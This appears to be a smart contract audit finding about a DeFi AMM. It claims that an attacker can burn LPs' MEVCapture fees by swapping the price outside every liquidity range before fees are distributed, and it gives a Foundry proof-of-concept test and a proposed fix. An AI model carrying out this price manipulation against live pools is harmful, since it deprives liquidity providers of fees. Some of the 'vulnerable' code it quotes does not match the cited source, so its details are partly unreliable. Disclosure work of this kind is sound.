## Title
MEVCapture Fees Can Be Permanently Burned by Manipulating Pool Liquidity During Fee Distribution

## Summary
The `accumulateAsFees` function in Core.sol distributes accumulated MEVCapture fees proportionally to current liquidity providers. An attacker can exploit concentrated liquidity mechanics to move the pool price outside all LP tick ranges, causing `liquidity` to become 0 at the moment of fee distribution, permanently burning fees that should have been distributed to LPs.

## Impact
**Severity**: Medium

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** The `accumulateAsFees` function should distribute accumulated fees from extensions (like MEVCapture) proportionally to liquidity providers based on their share of pool liquidity. The comment acknowledges fees are burned if liquidity is 0, but assumes this only happens for uninitialized pools.

**Actual Logic:** The function reads current pool liquidity at distribution time. In concentrated liquidity AMMs, pool liquidity represents only the active liquidity at the current price tick. When the price moves outside all LP-provided tick ranges, current liquidity becomes 0 even though the pool has positions. This causes fees to be burned instead of distributed.

**Exploitation Path:**

1. **Fee Accumulation**: During timestamp T, multiple swaps occur through MEVCapture, accumulating fees in the extension's saved balances. MEVCapture fee distribution is triggered at timestamp boundaries. [2](#0-1) 

2. **Price Manipulation**: Attacker executes a large swap at the end of timestamp T that moves the pool price to a tick outside all existing LP ranges (e.g., if all LPs provide liquidity in ticks 100-200, attacker swaps to move price to tick 300). This causes the pool's active liquidity to become 0. [3](#0-2) 

3. **Fee Distribution with Zero Liquidity**: At timestamp T+1, when anyone triggers a swap or calls `accumulatePoolFees()`, the MEVCapture extension distributes accumulated fees from timestamp T. However, since current liquidity is now 0, the fee distribution bypasses the liquidity-proportional allocation. [4](#0-3) 

4. **Fees Burned**: The fees are permanently lost - the extension's saved balances decrease (debt is properly settled), but no LP position receives the fees. LPs who provided liquidity during timestamp T lose their entitled share. [5](#0-4) 

**Security Property Broken:** Violates the "Fee Accounting" invariant - position fee collection must be accurate. LPs do not receive fees they are entitled to based on their liquidity provision during the period when fees were collected.

## Impact Explanation

- **Affected Assets**: MEVCapture fees (additional fees charged on top of base swap fees) that should be distributed to all active LPs during the accumulation period
- **Damage Severity**: LPs lose 100% of accumulated MEVCapture fees for the affected timestamp. In high-volume pools, this could represent significant value (e.g., if $100k in swaps occur with 1% MEV capture during the timestamp, ~$1k in fees would be burned)
- **User Impact**: All LPs who had positions during the fee accumulation period lose their proportional share of fees. This affects all liquidity providers in the pool, not just those in specific tick ranges.

## Likelihood Explanation

- **Attacker Profile**: Any user with sufficient capital to execute large swaps. MEV searchers or large traders could execute this attack opportunistically or intentionally.
- **Preconditions**: 
  - Pool must have concentrated liquidity (all LPs in specific tick ranges, not full-range)
  - Price must be movable outside all LP ranges with economically feasible swap size
  - Sufficient MEVCapture fees must have accumulated to make the attack worthwhile
- **Execution Complexity**: Single transaction at the end of a timestamp block. Attacker swaps to move price outside LP ranges, then waits for next timestamp when fees are naturally distributed.
- **Frequency**: Can be executed once per timestamp per pool where conditions are met. More likely in pools with narrow liquidity concentration or low total liquidity.

## Recommendation

**Option 1 (Recommended)**: Check if liquidity is non-zero before calling `accumulateAsFees`, and defer fee distribution if liquidity is temporarily 0:

```solidity
// In src/extensions/MEVCapture.sol, function locked_6416899205, around line 138:

// CURRENT (vulnerable):
if (fees0 != 0 || fees1 != 0) {
    CORE.accumulateAsFees(poolKey, fees0, fees1);
    unchecked {
        CORE.updateSavedBalances(
            poolKey.token0,
            poolKey.token1,
            PoolId.unwrap(poolId),
            -int256(uint256(fees0)),
            -int256(uint256(fees1))
        );
    }
}

// FIXED:
if (fees0 != 0 || fees1 != 0) {
    // Only distribute fees if there is active liquidity to receive them
    uint128 currentLiquidity = CORE.poolState(poolId).liquidity();
    if (currentLiquidity > 0) {
        CORE.accumulateAsFees(poolKey, fees0, fees1);
        unchecked {
            CORE.updateSavedBalances(
                poolKey.token0,
                poolKey.token1,
                PoolId.unwrap(poolId),
                -int256(uint256(fees0)),
                -int256(uint256(fees1))
            );
        }
    }
    // If liquidity is 0, fees remain in saved balances and will be distributed
    // when liquidity becomes available again at a future timestamp
}
```

**Option 2**: Track fee debt per position based on liquidity at fee collection time, rather than distributing at a single point in time. This is more complex but provides more accurate fee attribution.

## Proof of Concept

```solidity
// File: test/Exploit_BurnMEVCaptureFees.t.sol
// Run with: forge test --match-test test_BurnMEVCaptureFeesViaLiquidityManipulation -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../test/FullTest.sol";
import {MEVCapture} from "../src/extensions/MEVCapture.sol";
import {MEVCaptureRouter} from "../src/MEVCaptureRouter.sol";
import {createConcentratedPoolConfig} from "../src/types/poolConfig.sol";
import {SqrtRatio} from "../src/types/sqrtRatio.sol";

contract Exploit_BurnMEVCaptureFees is FullTest {
    MEVCapture mevCapture;
    MEVCaptureRouter mevRouter;

    function setUp() public override {
        FullTest.setUp();
        // Deploy MEVCapture extension
        address deployAddress = address(uint160(mevCaptureCallPoints().toUint8()) << 152);
        deployCodeTo("MEVCapture.sol", abi.encode(core), deployAddress);
        mevCapture = MEVCapture(deployAddress);
        mevRouter = new MEVCaptureRouter(core, address(mevCapture));
    }

    function test_BurnMEVCaptureFeesViaLiquidityManipulation() public {
        // SETUP: Create pool with MEVCapture and concentrated liquidity
        PoolKey memory poolKey = createPool(
            address(token0),
            address(token1),
            0, // current tick at 0
            createConcentratedPoolConfig(
                uint64(uint256(1 << 64) / 100), // 1% base fee
                100, // tick spacing
                address(mevCapture)
            )
        );

        // Create LP position in narrow range [−100, 100]
        uint256 lpId;
        uint128 lpLiquidity;
        (lpId, lpLiquidity) = createPosition(poolKey, -100, 100, 1_000_000, 1_000_000);

        // Record LP's initial uncollected fees
        (,,, uint128 fees0Before, uint128 fees1Before) = 
            positions.getPositionFeesAndLiquidity(lpId, poolKey, -100, 100);

        // Generate fees through multiple swaps at timestamp T
        token0.approve(address(mevRouter), type(uint256).max);
        token1.approve(address(mevRouter), type(uint256).max);
        
        // Swap 1: Generate MEVCapture fees
        mevRouter.swap({
            poolKey: poolKey,
            isToken1: false,
            amount: 50_000,
            sqrtRatioLimit: SqrtRatio.wrap(0),
            skipAhead: 0,
            calculatedAmountThreshold: type(int256).min,
            recipient: address(this)
        });

        // EXPLOIT: Swap to move price outside LP range [−100, 100]
        // This makes pool liquidity = 0
        mevRouter.swap({
            poolKey: poolKey,
            isToken1: false,
            amount: 500_000, // Large swap to move price far from 0
            sqrtRatioLimit: SqrtRatio.wrap(0),
            skipAhead: 0,
            calculatedAmountThreshold: type(int256).min,
            recipient: address(this)
        });

        // Verify price moved outside LP range
        int32 currentTick = core.poolState(poolKey.toPoolId()).tick();
        assertTrue(currentTick > 100 || currentTick < -100, "Price should be outside LP range");

        // Verify current liquidity is 0
        uint128 currentLiquidity = core.poolState(poolKey.toPoolId()).liquidity();
        assertEq(currentLiquidity, 0, "Pool liquidity should be 0");

        // Advance to next timestamp
        vm.warp(block.timestamp + 1);

        // Trigger fee distribution at T+1 by calling accumulatePoolFees
        mevCapture.accumulatePoolFees(poolKey);

        // VERIFY: LP did not receive accumulated fees (they were burned)
        (,,, uint128 fees0After, uint128 fees1After) = 
            positions.getPositionFeesAndLiquidity(lpId, poolKey, -100, 100);
        
        // Fees should have increased if properly distributed, but they didn't
        assertEq(fees0After, fees0Before, "LP fees should not increase - fees were burned");
        assertEq(fees1After, fees1Before, "LP fees should not increase - fees were burned");
    }
}
```

## Notes

This vulnerability is particularly concerning because:

1. **Natural Occurrence**: In volatile markets, prices frequently move outside concentrated liquidity ranges naturally, creating opportunities for this exploit without obvious manipulation.

2. **No Direct Attacker Profit**: The attacker doesn't directly gain the burned fees - they simply deny LPs their rightful fees. However, the attacker might profit indirectly (e.g., if they're an LP competitor, or through MEV extraction during the price manipulation).

3. **Protocol Design Issue**: The root cause is the mismatch between when fees are collected (continuously during a timestamp) and when they're distributed (at timestamp boundaries based on current liquidity snapshot).

4. **Extension-Specific**: While the vulnerability is in Core's `accumulateAsFees`, it specifically affects MEVCapture because that extension uses time-based fee distribution. Other callers of `accumulateAsFees` may not be affected the same way.

The recommended fix (checking liquidity before distribution) is simple and preserves fees for future distribution when liquidity returns, rather than permanently burning them.

### Citations

**File:** src/Core.sol (L228-276)
```text
    function accumulateAsFees(PoolKey memory poolKey, uint128 _amount0, uint128 _amount1) external payable {
        (uint256 id, address lockerAddr) = _requireLocker().parse();
        require(lockerAddr == poolKey.config.extension());

        PoolId poolId = poolKey.toPoolId();

        uint256 amount0;
        uint256 amount1;
        assembly ("memory-safe") {
            amount0 := _amount0
            amount1 := _amount1
        }

        // Note we do not check pool is initialized. If the extension calls this for a pool that does not exist,
        //  the fees are simply burned since liquidity is 0.

        if (amount0 != 0 || amount1 != 0) {
            uint256 liquidity;
            {
                uint128 _liquidity = readPoolState(poolId).liquidity();
                assembly ("memory-safe") {
                    liquidity := _liquidity
                }
            }

            unchecked {
                if (liquidity != 0) {
                    StorageSlot slot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);

                    if (amount0 != 0) {
                        slot0.store(
                            bytes32(uint256(slot0.load()) + FixedPointMathLib.rawDiv(amount0 << 128, liquidity))
                        );
                    }
                    if (amount1 != 0) {
                        StorageSlot slot1 = slot0.next();
                        slot1.store(
                            bytes32(uint256(slot1.load()) + FixedPointMathLib.rawDiv(amount1 << 128, liquidity))
                        );
                    }
                }
            }
        }

        // whether the fees are actually accounted to any position, the caller owes the debt
        _updatePairDebtWithNative(id, poolKey.token0, poolKey.token1, int256(amount0), int256(amount1));

        emit FeesAccumulated(poolId, _amount0, _amount1);
    }
```

**File:** src/extensions/MEVCapture.sol (L191-206)
```text
            if (lastUpdateTime != currentTime) {
                (int32 tick, uint128 fees0, uint128 fees1) =
                    loadCoreState({poolId: poolId, token0: poolKey.token0, token1: poolKey.token1});

                if (fees0 != 0 || fees1 != 0) {
                    CORE.accumulateAsFees(poolKey, fees0, fees1);
                    // never overflows int256 container
                    saveDelta0 -= int256(uint256(fees0));
                    saveDelta1 -= int256(uint256(fees1));
                }

                tickLast = tick;
                setPoolState({
                    poolId: poolId,
                    state: createMEVCapturePoolState({_lastUpdateTime: currentTime, _tickLast: tickLast})
                });
```
